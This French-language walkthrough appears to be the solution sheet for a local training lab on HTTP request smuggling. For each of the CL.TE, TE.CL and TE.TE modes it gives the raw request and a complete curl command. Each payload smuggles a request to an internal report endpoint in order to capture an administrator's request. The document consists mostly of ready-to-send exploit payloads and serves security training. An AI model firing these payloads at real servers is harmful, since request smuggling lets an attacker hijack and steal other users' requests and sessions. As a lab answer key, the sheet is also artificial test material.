## Challenge 1 : CL.TE (Mode : CL.TE)

**Configuration :** Assurez-vous que `CHALLENGE_MODE=CL.TE`.
**Exploit (Burp Suite) :**

```http
POST / HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 139

0

POST /ids/report HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 1500

threat_data=
```

**Exploit (Python) :**

```bash
python exploit_cl_te.py
```

**Exploit (Curl) :**

```bash
curl -i -s -X POST http://localhost:3000 \
-H "Transfer-Encoding: chunked" \
-H "Content-Length: 139" \
--data-binary $'0\r\n\r\nPOST /ids/report HTTP/1.1\r\nHost: localhost:8888\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1500\r\n\r\nthreat_data='
```

---

## Challenge 2 : TE.CL (Mode : TE.CL)

**Configuration :** Assurez-vous que `CHALLENGE_MODE=TE.CL`.
**Exploit (Burp Suite) :**

```http
POST / HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

86
POST /ids/report HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 1500

threat_data=
0


```

**Exploit (Python) :**

```bash
python exploit_te_cl.py
```

**Exploit (Curl) :**

```bash
curl -i -s -X POST http://localhost:3000 \
-H "Content-Length: 4" \
-H "Transfer-Encoding: chunked" \
--data-binary $'86\r\nPOST /ids/report HTTP/1.1\r\nHost: localhost:8888\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1500\r\n\r\nthreat_data=\r\n0\r\n\r\n'
```

---

## Challenge 3 : TE.TE (Mode : TE.TE)

**Configuration :** Assurez-vous que `CHALLENGE_MODE=TE.TE`.
**Exploit (Burp Suite) :**

```http
POST / HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding : chunked
Content-Length: 139

0

POST /ids/report HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 1500

threat_data=
```

**Exploit (Python) :**

```bash
python exploit_te_te.py
```

**Exploit (Curl) :**

```bash
curl -i -s -X POST http://localhost:3000 \
-H "Transfer-Encoding : chunked" \
-H "Content-Length: 139" \
--data-binary $'0\r\n\r\nPOST /ids/report HTTP/1.1\r\nHost: localhost:8888\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1500\r\n\r\nthreat_data='
```

## Vérification
1. Envoyez la requête d'exploit.
2. Accédez au dashboard : `http://localhost:3000/ids/dashboard`.
3. Vous devriez voir la requête de l'admin capturée.
